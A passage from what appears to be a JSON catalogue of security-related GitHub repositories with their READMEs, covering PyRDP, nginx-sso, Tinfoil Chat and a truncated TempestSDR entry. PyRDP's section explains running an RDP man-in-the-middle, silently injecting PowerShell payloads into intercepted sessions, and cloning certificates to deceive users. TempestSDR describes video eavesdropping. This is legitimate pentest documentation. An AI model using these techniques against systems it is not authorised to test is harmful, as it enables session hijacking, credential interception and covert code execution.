listening address](#changing-the-listening-address)\\n + [Other player arguments](#other-player-arguments)\\n * [Using the PyRDP Certificate Cloner](#using-the-pyrdp-certificate-cloner)\\n + [Cloning a certificate](#cloning-a-certificate)\\n + [Using a custom private key](#using-a-custom-private-key)\\n + [Other cloner arguments](#other-cloner-arguments)\\n * [Using PyRDP as a Library](#using-pyrdp-as-a-library)\\n * [Using PyRDP with twistd](#using-pyrdp-with-twistd)\\n * [Using PyRDP with Bettercap](#using-pyrdp-with-bettercap)\\n * [Docker Specific Usage Instructions](#docker-specific-usage-instructions)\\n + [Mapping a Listening Port](#mapping-a-listening-port)\\n + [Logs and Artifacts Storage](#logs-and-artifacts-storage)\\n + [Using the GUI Player in Docker](#using-the-gui-player-in-docker)\\n- [PyRDP Presentations](#pyrdp-presentations)\\n- [Contributing to PyRDP](#contributing-to-pyrdp)\\n- [Acknowledgements](#acknowledgements)\\n\\n\\n## Supported Systems\\nPyRDP should work on Python 3.6 and up.\\n\\nThis tool has been tested to work on Python 3.6 on Linux (Ubuntu 18.04) and Windows (See section [Installing on Windows](#installing-on-windows)). It has not been tested on OSX.\\n\\n## Installing\\n\\n_Note: PyRDP cannot be installed on 32bit systems. See: [this issue.](https://github.com/GoSecure/pyrdp/issues/150)_\\n\\n### Using the Docker Image\\n\\nThis is the easiest installation method if you have docker installed and working.\\n\\n```\\ndocker pull gosecure/pyrdp:latest\\n```\\n\\n### From Git Source\\n\\nWe recommend installing PyRDP in a\\n[virtual environment](https://packaging.python.org/guides/installing-using-pip-and-virtual-environments/)\\nto avoid dependency issues.\\n\\nFirst, make sure to install the prerequisite packages (on Ubuntu):\\n\\n```\\nsudo apt install libdbus-1-dev libdbus-glib-1-dev libgl1-mesa-glx git python3-dev\\n```\\n\\nOn some systems, you may need to install the `python3-venv` package:\\n\\n```\\nsudo apt install python3-venv\\n```\\n\\nGrab PyRDP's source code:\\n\\n```\\ngit clone https://github.com/gosecure/pyrdp.git\\n```\\n\\nThen, create your virtual environment in the `venv` directory inside PyRDP's directory:\\n\\n```\\ncd pyrdp \\npython3 -m venv venv\\n```\\n\\n*DO NOT* use the root PyRDP directory for the virtual environment folder (`python3 -m venv .`). You will make a mess,\\nand using a directory name like `venv` is more standard anyway.\\n\\nBefore installing the dependencies, you need to activate your virtual environment:\\n\\n```\\nsource venv/bin/activate\\n```\\n\\nFinally, you can install the project with Pip:\\n\\n```\\npip3 install -U pip setuptools wheel\\npip3 install -U -e .\\n```\\n\\nThis should install all the dependencies required to run PyRDP.\\n\\nIf you ever want to leave your virtual environment, you can simply deactivate it:\\n\\n```\\ndeactivate\\n```\\n\\nNote that you will have to activate your environment every time you want to have the PyRDP scripts available as shell\\ncommands.\\n\\n### Installing on Windows\\n\\nThe steps are almost the same. There are two additional prerequisites.\\n\\n1. Any C compiler\\n2. [OpenSSL](https://wiki.openssl.org/index.php/Binaries). Make sure it is reachable from your `$PATH`.\\n\\nThen, create your virtual environment in PyRDP's directory:\\n\\n```\\ncd pyrdp\\npython3 -m venv venv\\n```\\n\\n*DO NOT* use the root PyRDP directory for the virtual environment folder (`python3 -m venv .`). You will make a mess,\\nand using a directory name like `venv` is more standard anyway.\\n\\nBefore installing the dependencies, you need to activate your virtual environment:\\n\\n```\\nvenv\\\\Scripts\\\\activate\\n```\\n\\nFinally, you can install the project with Pip:\\n\\n```\\npip3 install -U pip setuptools wheel\\npip3 install -U -e .\\n```\\n\\nThis should install all the dependencies required to run PyRDP.\\n\\nIf you ever want to leave your virtual environment, you can simply deactivate it:\\n\\n```\\ndeactivate\\n```\\n\\nNote that you will have to activate your environment every time you want to have the PyRDP scripts available as shell\\ncommands.\\n\\n### Building the Docker Image\\n\\nFirst of all, build the image by executing this command at the root of PyRDP (where Dockerfile is located):\\n\\n```\\ndocker build -t pyrdp .\\n```\\n\\nAfterwards, you can execute PyRDP by invoking the `pyrdp` docker container. See [Usage instructions](#using-pyrdp) and the [Docker specific instructions](#docker-specific-usage-instructions) for details.\\n\\n### Migrating away from pycrypto\\nSince pycrypto isn't maintained anymore, we chose to migrate to pycryptodome.\\nIf you get this error, it means that you are using the module pycrypto instead of pycryptodome.\\n\\n```\\n[...]\\n File \\\"[...]/pyrdp/pyrdp/pdu/rdp/connection.py\\\", line 10, in <module>\\n from Crypto.PublicKey.RSA import RsaKey\\nImportError: cannot import name 'RsaKey'\\n```\\n\\nYou will need to remove the module pycrypto and reinstall PyRDP.\\n\\n```\\npip3 uninstall pycrypto\\npip3 install -U -e .\\n```\\n\\n## Using PyRDP\\n\\n### Using the PyRDP Man-in-the-Middle\\nUse `pyrdp-mitm.py <ServerIP>` or `pyrdp-mitm.py <ServerIP>:<ServerPort>` to run the MITM.\\n\\nAssuming you have an RDP server running on `192.168.1.10` and listening on port 3389, you would run:\\n\\n```\\npyrdp-mitm.py 192.168.1.10\\n```\\n\\nWhen running the MITM for the first time on Linux, a private key and certificate should be generated for you in `~/.config/pyrdp`.\\nThese are used when TLS security is used on a connection. You can use them to decrypt PyRDP traffic in Wireshark, for\\nexample.\\n\\n#### Specifying the private key and certificate\\nIf key generation didn't work or you want to use a custom key and certificate, you can specify them using the\\n`-c` and `-k` arguments:\\n\\n```\\npyrdp-mitm.py 192.168.1.10 -k private_key.pem -c certificate.pem\\n``` \\n\\n#### Connecting to the PyRDP player\\nIf you want to see live RDP connections through the PyRDP player, you will need to specify the ip and port on which the\\nplayer is listening using the `-i` and `-d` arguments. Note: the port argument is optional, the default port is 3000.\\n\\n```\\npyrdp-mitm.py 192.168.1.10 -i 127.0.0.1 -d 3000\\n```\\n\\n##### Connecting to a PyRDP player when the MITM is running on a server\\nIf you are running the MITM on a server and still want to see live RDP connections, you should use\\n[SSH remote port forwarding](https://www.booleanworld.com/guide-ssh-port-forwarding-tunnelling/)\\nto forward a port on your server to the player's port on your machine. Once this is done, you pass `127.0.0.1` and the forwarded\\nport as arguments to the MITM. For example, if port 4000 on the server is forwarded to the player's port on your machine,\\nthis would be the command to use:\\n\\n```\\npyrdp-mitm.py 192.168.1.10 -i 127.0.0.1 -d 4000\\n```\\n\\n#### Running payloads on new connections\\nPyRDP has support for running console commands or PowerShell payloads automatically when new connections are made.\\nDue to the nature of RDP, the process is a bit hackish and is not always 100% reliable. Here is how it works:\\n\\n1. Wait for the user to be authenticated.\\n2. Block the client's input / output to hide the payload and prevent interference.\\n3. Send a fake Windows+R sequence and run `cmd.exe`.\\n4. Run the payload as a console command and exit the console. If a PowerShell payload is configured, it is run with `powershell -enc <PAYLOAD>`.\\n5. Wait a bit to allow the payload to complete.\\n6. Restore the client's input / output.\\n\\nFor this to work, you need to set 3 arguments:\\n\\n- the payload\\n- the delay before the payload starts\\n- the payload's duration\\n\\n##### Setting the payload\\nYou can use one of the following arguments to set the payload to run:\\n\\n- `--payload`, a string containing console commands\\n- `--payload-powershell`, a string containing PowerShell commands\\n- `--payload-powershell-file`, a path to a PowerShell script\\n\\n##### Choosing when to start the payload\\nFor the moment, PyRDP does not detect when the user is logged on.\\nYou must give it an amount of time to wait for before running the payload.\\nAfter this amount of time has passed, it will send the fake key sequences and expect the payload to run properly.\\nTo do this, you use the `--payload-delay` argument. The delay is in milliseconds.\\nFor example, if you expect the user to be logged in within the first 5 seconds, you would use the following arguments:\\n\\n```\\n--payload-delay 5000\\n```\\n\\nThis could be made more accurate by leveraging some messages exchanged during RDPDR initialization.\\nSee [this issue](https://github.com/GoSecure/pyrdp/issues/98) if you're interested in making this work better.\\n\\n##### Choosing when to resume normal activity\\nBecause there is no direct way to know when the console has stopped running, you must tell PyRDP how long you want\\nthe client's input / output to be blocked. We recommend you set this to the maximum amount of time you would expect the\\nconsole that is running your payload to be visible. In other words, the amount of time you would expect your payload to\\ncomplete.\\nTo set the payload duration, you use the `--payload-duration` argument with an amount of time in milliseconds.\\nFor example, if you expect your payload to take up to 5 seconds to complete, you would use the following argument:\\n\\n```\\n--payload-duration 5000\\n```\\n\\nThis will block the client's input / output for 5 seconds to hide the console and prevent interference.\\nAfter 5 seconds, input / output is restored back to normal.\\n\\n#### Other MITM arguments\\nRun `pyrdp-mitm.py --help` for a full list of arguments.\\n\\n### Using the PyRDP Player\\nUse `pyrdp-player.py` to run the player.\\n\\n#### Playing a replay file\\nYou can use the menu to open a new replay file: File > Open.\\n\\nYou can also open replay files when launching the player:\\n\\n```\\npyrdp-player.py <FILE1> <FILE2> ...\\n```\\n\\n#### Listening for live connections\\nThe player always listens for live connections. By default, the listening port is 3000, but it can be changed:\\n\\n```\\npyrdp-player.py -p <PORT>\\n``` \\n\\n#### Changing the listening address\\nBy default, the player only listens to connections coming from the local machine. We do not recommend opening up the player\\nto other machines. If you still want to change the listening address, you can do it with `-b`:\\n\\n```\\npyrdp-player.py -b <ADDRESS>\\n```\\n\\n#### Other player arguments\\nRun `pyrdp-player.py --help` for a full list of arguments.\\n\\n### Using the PyRDP Certificate Cloner\\nThe PyRDP certificate cloner creates a brand new X509 certificate by using the values from an existing RDP server's\\ncertificate. It connects to an RDP server, downloads its certificate, generates a new private key and replaces the\\npublic key and signature of the certificate using the new private key. This can be used in a pentest if, for example,\\nyou're trying to trick a legitimate user into going through your MITM. Using a certificate that looks like a legitimate\\ncertificate could increase your success rate.\\n\\n#### Cloning a certificate\\nYou can clone a certificate by using `pyrdp-clonecert.py`:\\n\\n```\\npyrdp-clonecert.py 192.168.1.10 cert.pem -o key.pem\\n```\\n\\nThe `-o` parameter defines the path name to use for the generated private key.\\n\\n#### Using a custom private key\\nIf you want to use your own private key instead of generating a new one:\\n\\n```\\npyrdp-clonecert.py 192.168.1.10 cert.pem -i input_key.pem\\n```\\n\\n#### Other cloner arguments\\nRun `pyrdp-clonecert.py --help` for a full list of arguments.\\n\\n### Using PyRDP as a Library\\nIf you're interested in experimenting with RDP and making your own tools, head over to our\\n[documentation section](docs/README.md) for more information.\\n\\n### Using PyRDP with twistd\\nThe PyRDP MITM component was also implemented as a twistd plugin. This enables\\nyou to run it in debug mode and allows you to get an interactive debugging repl\\n(pdb) if you send a `SIGUSR2` to the twistd process.\\n\\n```\\ntwistd --debug pyrdp -t <target>\\n```\\n\\nThen to get the repl:\\n\\n```\\nkillall -SIGUSR2 twistd\\n```\\n\\n### Using PyRDP with twistd in Docker\\nIn a directory with our `docker-compose.yml` you can run something like this:\\n\\n```\\ndocker-compose run -p 3389:3389 pyrdp twistd --debug pyrdp --target 192.168.1.10:3389\\n```\\n\\nThis will allocate a TTY and you will have access to `Pdb`'s REPL. Trying to add `--debug` to the `docker-compose.yml` command will fail because there is no TTY allocated.\\n\\n### Using PyRDP with Bettercap\\nWe developped our own Bettercap module, `rdp.proxy`, to man-in-the-middle all RDP connections\\non a given LAN. Check out [this document](docs/bettercap-rdp-mitm.md) for more information.\\n\\n### Docker Specific Usage Instructions\\n\\nSince docker restricts the interactions with the host system (filesystem and network), the PyRDP docker image must be run with some parameters depending on your use case. This section documents those parameters.\\n\\nWe refer to the publicly provided docker image but if you [built your own](#building-the-docker-image) replace `gosecure/pyrdp` with the name of your locally built image.\\n\\n#### Mapping a Listening Port\\n\\nIn most of the man-in-the-middle cases you will need to map a port of your host into the docker image. This is achieved by the `--publish` (`-p`) parameters applied to `docker run`.\\n\\nFor example, to listen on 3389 (RDP's default port) on all interfaces, use:\\n\\n```\\ndocker run -p 3389:3389 gosecure/pyrdp pyrdp-mitm.py 192.168.1.10\\n```\\n\\n#### Logs and Artifacts Storage\\n\\nTo store the PyRDP output permanently (logs, files, etc.), add the `--volume` (`-v`) option to the previous command. In this example we store the files relatively to the current directory in `pyrdp_output`:\\n\\n```\\ndocker run -v $PWD/pyrdp_output:/home/pyrdp/pyrdp_output -p 3389:3389 gosecure/pyrdp pyrdp-mitm.py 192.168.1.10\\n```\\n\\nMake sure that your destination directory is owned by a user with a UID of 1000, otherwise you will get permission denied errors.\\nIf you are the only non-root user on the system, usually your user will be assigned UID 1000.\\n\\n#### Using the GUI Player in Docker\\n\\nUsing the player will require you to export the `DISPLAY` environment variable from the host to the docker.\\nThis redirects the GUI of the player to the host screen.\\nYou also need to expose the host's network and prevent Qt from using the MIT-SHM X11 Shared Memory Extension.\\nTo do so, add the `-e` and `--net` options to the run command:\\n\\n```\\ndocker run -e DISPLAY=$DISPLAY -e QT_X11_NO_MITSHM=1 --net=host gosecure/pyrdp pyrdp-player.py\\n```\\n\\nKeep in mind that exposing the host's network to docker can compromise the isolation between your container and the host.\\nIf you plan on using the player, X11 forwarding using an SSH connection would be a more secure way.\\n\\n\\n## PyRDP Presentations\\n\\n## Contributing to PyRDP\\nSee our [contribution guidelines](CONTRIBUTING.md).\\n\\n## Acknowledgements\\nPyRDP uses code from the following open-source software:\\n\\n- [RC4-Python](https://github.com/bozhu/RC4-Python) for the RC4 implementation.\\n- [rdesktop](https://github.com/rdesktop/rdesktop) for bitmap decompression.\\n- [rdpy](https://github.com/citronneur/rdpy) for RC4 keys, the bitmap decompression bindings and the base GUI code for\\nthe PyRDP player.\\n- [FreeRDP](https://github.com/FreeRDP/FreeRDP) for the scan code enumeration.\\n\"", "topics": ["mitm", "redteam", "rdp"], "writeup": "", "ignoredescription": false, "id": 50, "full_name": "lifa123/pyrdp", "url": "https://github.com/lifa123/pyrdp", "topic_string": "mitm redteam rdp"},
{"tags": [], "owner": "Luzifer", "description": "SSO authentication provider for the auth_request nginx module", "name": "nginx-sso", "topics_string": "", "language": "Go", "readme": "\"[![Go Report Card](https://goreportcard.com/badge/github.com/Luzifer/nginx-sso)](https://goreportcard.com/report/github.com/Luzifer/nginx-sso)\\n![](https://badges.fyi/github/license/Luzifer/nginx-sso)\\n![](https://badges.fyi/github/downloads/Luzifer/nginx-sso)\\n![](https://badges.fyi/github/latest-release/Luzifer/nginx-sso)\\n\\n# Luzifer / nginx-sso\\n\\nThis program is intended to be used within the [`ngx_http_auth_request_module`](https://nginx.org/en/docs/http/ngx_http_auth_request_module.html) of nginx to provide a single-sign-on for a domain using one central authentication directory.\\n\\n## Documentation\\n\\nIn order to increase readability of the documentation it has been moved to the [Github project Wiki](https://github.com/Luzifer/nginx-sso/wiki). You can find everything previously documented in the README there.\\n\"", "topics": ["ldap", "duo", "oauth2", "mfa", "oidc", "totp", "sso", "nginx", "yubikey"], "writeup": "nginx-sso is intended to be used within the ngx_http_auth_request_module of Nginx to provide a single-sign-on (SSO) for a domain using one central authentication directory.", "ignoredescription": false, "id": 51, "full_name": "Luzifer/nginx-sso", "url": "https://github.com/Luzifer/nginx-sso", "topic_string": "ldap duo oauth2 mfa oidc totp sso nginx yubikey"},
{"tags": [], "owner": "maqp", "description": "Tinfoil Chat - Onion-routed, endpoint secure messaging system", "name": "tfc", "topics_string": "", "language": "Python", "readme": "\"<img align=\\\"right\\\" src=\\\"https://cs.helsinki.fi/u/oottela/tfc_logo.png\\\" style=\\\"position: relative; top: 0; left: 0;\\\">\\n\\n### Tinfoil Chat\\n\\n[![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)\\n[![Python 3.7|3.8](https://img.shields.io/badge/python-3.7%20%7C%C2%A03.8-blue)](https://img.shields.io/badge/python-3.7%20%7C%C2%A03.8-blue)\\n[![Checked with mypy](http://www.mypy-lang.org/static/mypy_badge.svg)](http://mypy-lang.org/)\\n[![Build Status](https://travis-ci.org/maqp/tfc.svg?branch=master)](https://travis-ci.org/maqp/tfc) \\n[![Coverage Status](https://coveralls.io/repos/github/maqp/tfc/badge.svg?branch=master)](https://coveralls.io/github/maqp/tfc?branch=master)\\n[![Codacy Badge](https://api.codacy.com/project/badge/Grade/71fa9cc1da424f52a576a04c2722da26)](https://www.codacy.com/manual/maqp/tfc?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=maqp/tfc&amp;utm_campaign=Badge_Grade)\\n[![CodeFactor](https://www.codefactor.io/repository/github/maqp/tfc/badge)](https://www.codefactor.io/repository/github/maqp/tfc)\\n[![Requirements Status](https://requires.io/github/maqp/tfc/requirements.svg?branch=master)](https://requires.io/github/maqp/tfc/requirements/?branch=master)\\n[![Snyk Report](https://snyk.io/test/github/maqp/tfc/badge.svg)](https://snyk.io/test/github/maqp/tfc)\\n\\nTinfoil Chat (TFC) is a\\n[FOSS](https://www.gnu.org/philosophy/free-sw.html)+[FHD](https://www.gnu.org/philosophy/free-hardware-designs.en.html)\\n[peer-to-peer](https://en.wikipedia.org/wiki/Peer-to-peer)\\nmessaging system that relies on high assurance hardware architecture to protect users from\\n[passive collection](https://en.wikipedia.org/wiki/Upstream_collection), \\n[MITM attacks](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)\\nand most importantly,\\n[remote key exfiltration](https://en.wikipedia.org/wiki/Data_exfiltration). \\nTFC is designed for people with one of the most complex threat models: organized crime \\ngroups and nation state hackers who bypass end-to-end encryption of traditional secure \\nmessaging apps by hacking the endpoint.\\n\\n\\n#### State-of-the-art cryptography\\n\\nTFC uses\\n[XChaCha20](https://cr.yp.to/chacha/chacha-20080128.pdf)-[Poly1305](https://cr.yp.to/mac/poly1305-20050329.pdf)\\n[end-to-end encryption](https://en.wikipedia.org/wiki/End-to-end_encryption)\\nwith\\n[deniable authentication](https://en.wikipedia.org/wiki/Deniable_encryption#Deniable_authentication)\\nto protect all messages and files sent to individual recipients and groups. \\nThe symmetric keys are either\\n[pre-shared](https://en.wikipedia.org/wiki/Pre-shared_key),\\nor exchanged using\\n[X448](https://eprint.iacr.org/2015/625.pdf),\\nthe base-10\\n[fingerprints](https://en.wikipedia.org/wiki/Public_key_fingerprint)\\nof which are verified via an out-of-band channel. TFC provides per-message\\n[forward secrecy](https://en.wikipedia.org/wiki/Forward_secrecy)\\nwith\\n[BLAKE2b](https://blake2.net/blake2.pdf) \\nbased\\n[hash ratchet](https://www.youtube.com/watch?v=9sO2qdTci-s#t=1m34s).\\nAll persistent user data is encrypted locally using XChaCha20-Poly1305, the key \\nof which is derived from password and salt using \\n[Argon2id](https://github.com/P-H-C/phc-winner-argon2/blob/master/argon2-specs.pdf),\\nthe parameters of which are automatically tuned according to best \\npractices. Key generation of TFC relies on Linux kernel's \\n[getrandom()](https://manpages.debian.org/testing/manpages-dev/getrandom.2.en.html),\\na syscall for its ChaCha20 based \\n[CSPRNG](https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator).\\n\\n\\n#### Anonymous by design\\nTFC routes all communication exclusively through the \\n[Tor](https://2019.www.torproject.org/about/overview.html.en) \\nanonymity network. It uses the next generation\\n([v3](https://trac.torproject.org/projects/tor/wiki/doc/NextGenOnions))\\n[Tor Onion Services](https://2019.www.torproject.org/docs/onion-services)\\nto enable P2P communication that never exits the Tor network. This makes it hard for the \\nusers to accidentally deanonymize themselves. It also means that unlike (de)centralized \\nmessengers, there's no third party server with access to user metadata such as who is \\ntalking to whom, when, and how much. The network architecture means TFC runs exclusively \\non the user's devices. There are no ads or tracking, and it collects no data whatsoever \\nabout the user. All data is always encrypted with keys the user controls, and the \\ndatabases never leave the user's device.\\n\\nUsing Onion Services also means no account registration is needed. During the first launch \\nTFC generates a random TFC account (an Onion Service address) for the user, e.g.\\n`4sci35xrhp2d45gbm3qpta7ogfedonuw2mucmc36jxemucd7fmgzj3ad`. By knowing this TFC account, \\nanyone can send the user a contact request and talk to them without ever learning their \\nreal life identity, IP-address, or geolocation. Protected geolocation makes physical \\nattacks very difficult because the attacker doesn't know where the device is located on \\nthe planet. At the same time it makes the communication censorship resistant: Blocking TFC \\nrequires blocking Tor categorically, nation-wide.\\n\\nTFC also features a traffic masking mode that hides the type, quantity, and schedule of \\ncommunication, even if the network facing device of the user is hacked. To provide even\\nfurther metadata protection from hackers, the Internet-facing part of TFC can be run on \\n[Tails](https://tails.boum.org/), a privacy and anonymity focused operating system that \\ncontains no personal files of the user (which makes it hard to deduce to whom the endpoint\\nbelongs to), and that provides \\n[additional layers of protection](https://github.com/Whonix/onion-grater)\\nfor their anonymity.\\n\\n\\n#### First messaging system with endpoint security\\n\\nTFC is designed to be used in hardware configuration that provides strong\\n[endpoint security](https://en.wikipedia.org/wiki/Endpoint_security).\\nThis configuration uses three computers per endpoint: Encryption and decryption processes\\nare separated from each other onto two isolated computers, the Source Computer, and the \\nDestination Computer. These two devices are are dedicated for TFC. This split \\n[TCB](https://en.wikipedia.org/wiki/Trusted_computing_base)\\ninteracts with the network via the user's daily computer, called the Networked Computer.\\n\\nIn TFC data moves from the Source Computer to the Networked Computer, and from the Networked \\nComputer to the Destination Computer, unidirectionally. The unidirectionality of data\\nflow is enforced, as the data is passed from one device to another only through a free \\nhardware design\\n[data diode](https://en.wikipedia.org/wiki/Unidirectional_network), \\nthat is connected to the three computers using one USB-cable per device.\\nThe Source and Destination Computers are not connected to the Internet, or to any device \\nother than the data diode.\\n\\n\\n![](https://www.cs.helsinki.fi/u/oottela/wiki/readme/data_diode.jpg)\\n[TFC data diode](https://www.cs.helsinki.fi/u/oottela/wiki/readme/data_diode.jpg)\\n\\nOptical repeater inside the\\n[optocouplers](https://en.wikipedia.org/wiki/Opto-isolator)\\nof the data diode enforce direction of data transmission with the fundamental laws of \\nphysics. This protection is so strong, the certified implementations of data diodes are \\ntypically found in critical infrastructure protection and government networks where the\\nclassification level of data varies between systems. A data diode might e.g. allow access \\nto a nuclear power plant's safety system readings, while at the same time preventing \\nattackers from exploiting these critical systems. An alternative use case is to allow \\nimporting data from less secure systems to ones that contain classified documents that \\nmust be protected from exfiltration.\\n\\nIn TFC the hardware data diode ensures that neither of the TCB-halves can be accessed \\nbidirectionally. Since the protection relies on physical limitations of the hardware's\\ncapabilities, no piece of malware, not even a \\n[zero-day exploit](https://en.wikipedia.org/wiki/Zero-day_(computing))\\ncan bypass the security provided by the data diode.\\n\\n\\n### How it works\\n\\nWith the hardware in place, all that's left for the users to do is launch the device \\nspecific TFC program on each computer.\\n\\n![](https://www.cs.helsinki.fi/u/oottela/wiki/readme/overview.png)\\n[System overview](https://www.cs.helsinki.fi/u/oottela/wiki/readme/overview.png)\\n\\nIn the illustration above, Alice enters messages and commands to Transmitter Program \\nrunning on her Source Computer. The Transmitter Program encrypts and signs plaintext \\ndata and relays the ciphertexts from Source Computer to her Networked Computer \\nthrough the data diode.\\n\\nRelay Program on Alice's Networked Computer relays commands and copies of outgoing \\nmessages to her Destination Computer via the data diode. Receiver Program on Alice's \\nDestination Computer authenticates, decrypts and processes the received message/command.\\n\\nAlice's Relay Program shares messages and files to Bob over a Tor Onion Service. \\nThe web client of Bob's Relay Program fetches the ciphertext from Alice's Onion \\nService and forwards it to his Destination Computer through his data diode. Bob's \\nReceiver Program then authenticates, decrypts and processes the received message/file.\\n\\nWhen Bob responds, he will type his message to the Transmitter Program on his Source \\nComputer, and after a mirrored process, Alice reads the message from the Receiver Program\\non her Destination Computer.\\n\\n\\n### Why keys and plaintexts cannot be exfiltrated\\n\\nThe architecture described above simultaneously utilizes both\\n[the classical and the alternative data diode models](https://en.wikipedia.org/wiki/Unidirectional_network#Applications) \\nto enable bidirectional communication between two users, while at the same time providing \\nhardware enforced endpoint security: \\n\\n1. The Destination Computer uses the classical data diode model. This means it can receive \\ndata from the insecure Networked Computer, but is unable to send data back to the Networked \\nComputer. The Receiver Program is designed to function under these constraints. However,\\neven though the program authenticates and validates all incoming data, it is not ruled out \\nmalware couldn't still infiltrate the Destination Computer. However, in the event that \\nwould happen, the malware would be unable to exfiltrate sensitive keys or plaintexts back \\nto the Networked Computer, as the data diode prevents all outbound traffic.\\n\\n2. The Source Computer uses the alternative data diode model. This means it can output\\nencrypted data to the insecure Networked Computer without having to worry about being\\ncompromised: The data diode protects the Source Computer from all attacks by physically\\npreventing all inbound traffic. The Transmitter Program is also designed to work under\\nthe data flow constraints introduced by the data diode; To allow key exchanges, the short \\nelliptic-curve public keys are input manually by the user. \\n\\n3. The Networked Computer is designed under the assumption it can be compromised by a\\nremote attacker: All sensitive data that passes through the Relay Program is encrypted and \\nsigned with no exceptions. Since the attacker is unable to exfiltrate decryption keys from \\nthe Source or Destination Computer, the ciphertexts are of no value to the attacker. \\n\\n\\n![](https://www.cs.helsinki.fi/u/oottela/wiki/readme/attacks.png)\\n[Exfiltration security](https://www.cs.helsinki.fi/u/oottela/wiki/readme/attacks.png)\\n\\n\\n### Qubes-isolated intermediate solution\\n\\nFor some users the\\n[APTs](https://en.wikipedia.org/wiki/Advanced_persistent_threat) \\nof the modern world are not part of the threat model, and for others, the \\nrequirement of having to build the data diode by themselves is a deal breaker. Yet, for \\nall of them, storing private keys on a networked device is still a security risk.\\n\\nTo meet these users' needs, TFC can also be run in three dedicated \\n[Qubes](https://www.qubes-os.org/)\\nvirtual machines. With the Qubes configuration, the isolation is provided by the \\n[Xen hypervisor](https://xenproject.org/users/security/), \\nand the unidirectionality of data flow between the VMs is enforced with strict firewall \\nrules. This intermediate isolation mechanism runs on a single computer which means no \\nhardware data diode is needed. \\n\\n\\n### Supported Operating Systems\\n\\n#### Source/Destination Computer\\n- Debian 10\\n- PureOS 9.0\\n- *buntu 20.04 LTS\\n- Linux Mint 20\\n- LMDE 4\\n- Qubes 4 (Debian 10 VM)\\n\\n#### Networked Computer\\n- Tails 4.8\\n- Debian 10\\n- PureOS 9.0\\n- *buntu 20.04 LTS\\n- Linux Mint 20\\n- LMDE 4\\n- Qubes 4 (Debian 10 VM)\\n\\n\\n### More information\\n[Threat model](https://github.com/maqp/tfc/wiki/Threat-model)<br>\\n[FAQ](https://github.com/maqp/tfc/wiki/FAQ)<br>\\n[Security design](https://github.com/maqp/tfc/wiki/Security-design)<br>\\n\\nHardware Data Diode<Br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Breadboard version](https://github.com/maqp/tfc/wiki/TTL-Data-Diode-(breadboard)) (Easy)<br> \\n&nbsp;&nbsp;&nbsp;&nbsp;[Perfboard version](https://github.com/maqp/tfc/wiki/TTL-Data-Diode-(perfboard)) (Intermediate)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[PCB version](https://github.com/maqp/tfc/wiki/TTL-Data-Diode-(PCB)) (Advanced)<br>\\n\\nHow to use<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Installation](https://github.com/maqp/tfc/wiki/Installation)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Master password setup](https://github.com/maqp/tfc/wiki/Master-Password)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Local key setup](https://github.com/maqp/tfc/wiki/Local-Key-Setup)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Onion Service setup](https://github.com/maqp/tfc/wiki/Onion-Service-Setup)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[X448 key exchange](https://github.com/maqp/tfc/wiki/X448)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Pre-shared keys](https://github.com/maqp/tfc/wiki/PSK)<br>\\n&nbsp;&nbsp;&nbsp;&nbsp;[Commands](https://github.com/maqp/tfc/wiki/Commands)<br>\\n\\n[Update log](https://github.com/maqp/tfc/wiki/Update-Log)<br>\\n\"", "topics": ["tor", "tails"], "writeup": "", "ignoredescription": false, "id": 52, "full_name": "maqp/tfc", "url": "https://github.com/maqp/tfc", "topic_string": "tor tails"},
{"tags": [], "owner": "martinmarinov", "description": "Remote video eavesdropping using a software-defined radio platform", "name": "TempestSDR", "topics_string": "", "language": "C", "readme": "\"TempestSDR\\n=============\\n\\nThis project is a software toolkit for remotely eavesdropping video monitors using a Software Defined Radio (SDR) receiver. It exploits compromising emanations from cables carrying video signals.\\n\\nRaster video is usually transmitted one line of pixels at a time, encoded as a varying current. This generates an electromagnetic wave that can be picked up by an SDR receiver. The software maps the received field strength of a pixel to a gray-scale shade in real-time. This forms a false colour estimate of the original video signal.\\n\\nThe toolkit uses unmodified off-the-shelf hardware which lowers the costs and increases mobility compared to existing solutions. It allows for additional post-processing which improves the signal-to-noise ratio. The attacker does not need to have prior knowledge about the target video display. All parameters such as resolution and refresh rate are estimated with the aid of the software. \\n\\nThe software consists of a library written in C, a collection of plug-ins for various Software Define Radio (SDR) front-ends and a Java based Graphical User Interface (GUI). It is a multi-platform application, with all native libraries pre-compiled and packed into a single Java jar file.\\n\\nRelease\\n------------\\n\\n * [JTempestSDR.jar](https://raw.github.com/martinmarinov/TempestSDR/master/Release/JavaGUI/JTempestSDR.jar) is the self contained multi platform GUI executable. It should work with just a double click on most Windows/Ubuntu x86/x64 based machines.\\n * [Download dlls] (https://github.com/martinmarinov/TempestSDR/tree/master/Release/dlls) contains the precompiled dll files for Linux/Windows x86/x64 which you can use in your own project under the GNU GPL license.\\n\\nDouble click on the JTempestSDR.jar file to launch. If it fails to launch, you will need to recompile the project.\\n\\n\\nBuilding the executable\\n------------\\n\\nThis is the Java wrapper and GUI. It builds all projects and supported plugins including the Java GUI itself. Go into the JavaGUI folder and type in\\n\\n make all\\n\\nIf it fails to find \\\"jni.h\\\", you should run one of the following commands:\\n\\n make all JAVA_HOME=path_to_jdk_installation\\n\\nOn Windows 8 x64 this could look like\\n\\n make all JAVA_HOME=C:/PROGRA~2/Java/jdk1.7.0_45\\n\\t\\nTo force compilation for X64 or X32 (in case your compiler supports it), do the following\\n\\n make all JAVA_HOME=C:/PROGRA~2/Java/jdk1.7.0_45 ARCHNAME=X64\\n\\nOn Ubuntu with openjdk it could look like\\n\\n make all JAVA_HOME=/usr/lib/jvm/java-6-openjdk-amd64\\n\\nOn Mac OSX commmand might look like\\n\\n make all JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_111.jdk/Contents/Home\\n\\nNote: This will also compile the plugins. Some of them require additional libraries! You can disable the plugin compilation by editing the Makefile in JavaSDR.\\n\\n### Windows\\n\\nYou need to have MinGW installed.\\n\\nOn Windows, this will also 